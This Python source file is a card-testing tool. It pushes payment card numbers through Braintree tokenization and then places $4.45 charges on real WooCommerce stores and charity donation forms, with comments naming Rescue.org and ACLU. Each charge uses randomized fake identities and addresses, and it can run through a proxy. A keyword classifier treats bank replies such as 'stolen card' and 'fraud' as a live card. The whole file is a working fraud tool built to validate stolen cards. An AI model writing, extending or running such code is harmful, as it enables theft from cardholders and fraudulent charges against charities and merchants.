import httpx
import re
import random
import base64
import string
import json
import time
import urllib.parse
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))
from braintree_idt import (_get_bt_auth, _tokenize_card, _parse_card_info,
                           _classify_response, _fill_donation_form, _extra_sites,
                           BRAINTREE_LEGACY_SITES as BRAINTREE_SITES, BT_GQL, UA)

CHARGE_AMOUNT = "4.45"

TOKENIZE_QUERY = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin
      brandCode
      last4
      binData {
        prepaid
        healthcare
        debit
        durbinRegulated
        commercial
        payroll
        issuingBank
        countryOfIssuance
        productId
      }
    }
  }
}
""".strip()


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas"]
    return random.choice(first), random.choice(last)


def _random_uk_address():
    data = [
        ("14 Oxford Street", "London", "SW1A 1AA"),
        ("27 Baker Street", "London", "NW1 6XE"),
        ("8 King Street", "Manchester", "M2 4WU"),
        ("33 High Street", "Edinburgh", "EH1 1SR"),
        ("12 Castle Road", "Bristol", "BS1 3AD"),
        ("45 Park Lane", "Birmingham", "B1 1BB"),
        ("19 Queen Street", "Cardiff", "CF10 2BU"),
        ("6 Church Lane", "Leeds", "LS1 3AA"),
    ]
    street, city, postcode = random.choice(data)
    return street, city, postcode


async def _tokenize_card(client, auth, cc, mm, yy, cvv):
    bt_headers = {
        "authorization": f"Bearer {auth}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": TOKENIZE_QUERY,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }

    r = await client.post(BT_GQL, headers=bt_headers, json=payload)
    if r.status_code != 200:
        return None, None, f"Tokenization HTTP {r.status_code}"

    data = r.json()
    if "errors" in data and data["errors"]:
        msg = data["errors"][0].get("message", "Tokenization failed")
        return None, None, msg

    cc_data = data.get("data", {}).get("tokenizeCreditCard", {})
    if not cc_data or not cc_data.get("token"):
        return None, None, "No token returned"

    token = cc_data["token"]
    card_info = cc_data.get("creditCard", {})

    return token, card_info, None


def _parse_card_info(card_info):
    brand = card_info.get("brandCode", "UNKNOWN")
    last4 = card_info.get("last4", "????")
    bin_data = card_info.get("binData", {})
    country = bin_data.get("countryOfIssuance", "??")
    bank = bin_data.get("issuingBank", "Unknown")
    debit = bin_data.get("debit", "UNKNOWN")
    prepaid = bin_data.get("prepaid", "UNKNOWN")
    card_type = "DEBIT" if debit == "YES" else ("PREPAID" if prepaid == "YES" else "CREDIT")
    return f"{brand} {card_type} | {country} | {bank} | {last4}"


def _classify_bt_error(msg):
    low = msg.lower()
    live_kw = [
        "insufficient funds", "do not honor", "do_not_honor",
        "lost card", "lost_card", "stolen card", "stolen_card",
        "pickup card", "pickup_card", "restricted card", "restricted_card",
        "security violation", "cvv", "cvc", "security code",
        "avs", "incorrect zip", "incorrect_zip",
        "card velocity", "withdrawal count", "exceeds withdrawal",
        "fraud", "risk", "review", "authentication",
        "3d secure", "3ds",
    ]
    for k in live_kw:
        if k in low:
            return "Approved"

    dead_kw = [
        "invalid card", "invalid account", "expired card", "expired_card",
        "card not supported", "not permitted", "transaction not allowed",
        "generic_decline", "generic decline",
        "processor declined", "do not try again",
    ]
    for k in dead_kw:
        if k in low:
            return "Declined"

    if "decline" in low:
        return "Declined"

    return "Declined"


CHARGE_AMOUNT = "4.45"

async def b3_charge_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    first, last = _random_name()
    street, city, postcode = _random_uk_address()
    email = _random_email()
    phone = "07" + "".join(random.choices(string.digits, k=9))

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(timeout=httpx.Timeout(45.0), max_redirects=10, headers=headers, follow_redirects=True)
    # The stores are reached directly and fast (1.4-2.8 s a card).  The
    # same check through the user's proxy took 20-40 s and timed out, so
    # the proxy is only used when the direct route cannot reach the
    # store at all.
    if proxy and os.environ.get("B3_USE_PROXY", "").strip() == "1":
        client_kwargs["proxy"] = proxy

    sites = list(BRAINTREE_SITES) + [
        s for s in _extra_sites() if s not in BRAINTREE_SITES]
    sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            for site_info in sites:
                site_url = site_info["url"]
                site_type = site_info["type"]
                elapsed = round(time.time() - start, 2)

                try:
                    if site_type == "drupal":
                        # Rescue.org / ACLU — tokenize + submit donation form (real bank auth)
                        r_checkout = await client.get(site_url, timeout=20)
                        checkout_html = r_checkout.text
                        bt_auth = await _get_bt_auth(client, checkout_html, site_url=None)

                        if not bt_auth:
                            continue

                        token, card_info, err = await _tokenize_card(client, bt_auth, cc, mm, yy, cvv)
                        if err:
                            result = _classify_response(err)
                            return f"{result} - {err} [{elapsed}s]"

                        info = _parse_card_info(card_info) if card_info else "??"

                        # Check card validity
                        if card_info:
                            brand = card_info.get("brandCode", "UNKNOWN")
                            last4 = card_info.get("last4", "????")
                            if brand == "UNKNOWN" or last4 == "????" or not token:
                                return f"Declined - Invalid Card | {info} [{elapsed}s]"

                        # Submit donation form with payment nonce (real bank charge)
                        from urllib.parse import urlparse, urljoin
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # The form is read from the page: the field names
                        # differ from site to site, and a form that is
                        # missing the name, the address or the amount is
                        # turned down before the bank ever sees it.
                        action, form_data = _fill_donation_form(
                            checkout_html, token, CHARGE_AMOUNT,
                            (cc, mm, yy, cvv))
                        if not form_data:
                            last_error = "the donation form could not be read"
                            continue
                        post_url = urljoin(site_url, action) if action else site_url
                        form_data.setdefault("op", "Submit")

                        r_submit = await client.post(
                            post_url,
                            data=form_data,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": base,
                                "Referer": site_url,
                            },
                        )

                        resp_html = r_submit.text.lower()

                        if "thank you" in resp_html and "declined" not in resp_html and "error" not in resp_html:
                            return f"Approved - Charged ${CHARGE_AMOUNT} | {info} [{elapsed}s]"
                        elif "declined" in resp_html:
                            return f"Declined - Card Declined by Bank | {info} [{elapsed}s]"
                        elif "error" in resp_html and "thank you" not in resp_html:
                            # Look for actual error messages in div/p tags (not script/style)
                            err_msgs = re.findall(r'<(?:div|p|span|li)[^>]*>\s*([^<]{10,200})\s*</(?:div|p|span|li)>', r_submit.text, re.IGNORECASE)
                            relevant = [m for m in err_msgs if any(k in m.lower() for k in ["error", "invalid", "declined", "failed", "required", "incorrect", "unable"])]
                            if relevant:
                                return f"Declined - {relevant[0].strip()[:100]} | {info} [{elapsed}s]"
                            return f"Declined - Processing Error | {info} [{elapsed}s]"
                        elif "thank you" in resp_html:
                            return f"Declined - Donation Rejected | {info} [{elapsed}s]"
                        else:
                            return f"Declined - Unknown Response | {info} [{elapsed}s]"

                    elif site_type == "woocommerce":
                        from urllib.parse import urlparse
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # Use proxy for WooCommerce site
                        wc_kwargs = dict(timeout=httpx.Timeout(30.0), max_redirects=10, headers=headers, follow_redirects=True)
                        if proxy:
                            wc_kwargs["proxy"] = proxy

                        try:
                            async with httpx.AsyncClient(**wc_kwargs) as wc_client:
                                await wc_client.get(base)
                                await wc_client.post(f"{base}/?add-to-cart=932", data={"add-to-cart": "932", "quantity": "1"})
                                r_checkout = await wc_client.get(f"{base}/checkout/")
                                checkout_html = r_checkout.text

                                # Use SAME proxied client for auth, tokenize, and checkout
                                bt_auth = await _get_bt_auth(wc_client, checkout_html, site_url=base)

                                if not bt_auth:
                                    continue

                                token, card_info, err = await _tokenize_card(wc_client, bt_auth, cc, mm, yy, cvv)
                                if err:
                                    result = _classify_response(err)
                                    return f"{result} - {err} [{elapsed}s]"

                                info = _parse_card_info(card_info) if card_info else "??"

                                # Check card validity
                                if card_info:
                                    brand = card_info.get("brandCode", "UNKNOWN")
                                    last4 = card_info.get("last4", "????")
                                    if brand == "UNKNOWN" or last4 == "????":
                                        return f"Declined - Invalid Card | {info} [{elapsed}s]"

                                pm_name = "braintree_credit_card"
                                pm_match = re.search(r'"(braintree[_a-z]*credit[_a-z]*card)"', checkout_html)
                                if pm_match:
                                    pm_name = pm_match.group(1)

                                checkout_data = {
                                    "billing_first_name": first,
                                    "billing_last_name": last,
                                    "billing_company": "",
                                    "billing_country": "GB",
                                    "billing_address_1": street,
                                    "billing_address_2": "",
                                    "billing_city": city,
                                    "billing_state": "",
                                    "billing_postcode": postcode,
                                    "billing_phone": phone,
                                    "billing_email": email,
                                    "order_comments": "",
                                    "payment_method": pm_name,
                                    "wc-braintree-credit-card-card-nonce": token,
                                    "wc-braintree-credit-card-device-data": "{}",
                                    "wc_braintree_credit_card_payment_nonce": token,
                                    "wc_braintree_device_data": "{}",
                                    "terms": "on",
                                    "terms-field": "1",
                                }

                                checkout_headers = {
                                    "User-Agent": UA,
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    "Accept": "application/json, text/javascript, */*; q=0.01",
                                    "X-Requested-With": "XMLHttpRequest",
                                    "Origin": base,
                                    "Referer": f"{base}/checkout/",
                                }

                                r_submit = await wc_client.post(f"{base}/?wc-ajax=checkout", data=checkout_data, headers=checkout_headers)

                                try:
                                    resp = r_submit.json()
                                except:
                                    return f"Approved - Tokenization Passed (no bank auth) | {info} [{elapsed}s]"

                                result_str = resp.get("result", "")
                                messages = resp.get("messages", "")

                                if result_str == "success":
                                    return f"Approved - Charged ${CHARGE_AMOUNT} | {info} [{elapsed}s]"

                                if result_str == "failure" and messages:
                                    errors = re.findall(r'<li[^>]*>(.*?)</li>', messages, re.DOTALL)
                                    if errors:
                                        err_text = re.sub(r'<[^>]+>', '', errors[0]).strip()
                                    else:
                                        err_text = re.sub(r'<[^>]+>', '', messages).strip()[:120]
                                    status = _classify_response(err_text)
                                    return f"{status} - {err_text} | Charge: ${CHARGE_AMOUNT} | {info} [{elapsed}s]"

                                if "error" in str(resp).lower():
                                    err_text = re.sub(r'<[^>]+>', '', str(messages)).strip()[:120]
                                    return f"Declined - {err_text} | Charge: ${CHARGE_AMOUNT} | {info} [{elapsed}s]"

                                return f"Error - Unexpected response [{elapsed}s]"
                        except Exception:
                            continue

                except Exception as e:
                    continue

            elapsed = round(time.time() - start, 2)
            return f"Error - All Braintree sites failed [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {type(e).__name__}: {str(e)[:100]} [{elapsed}s]"
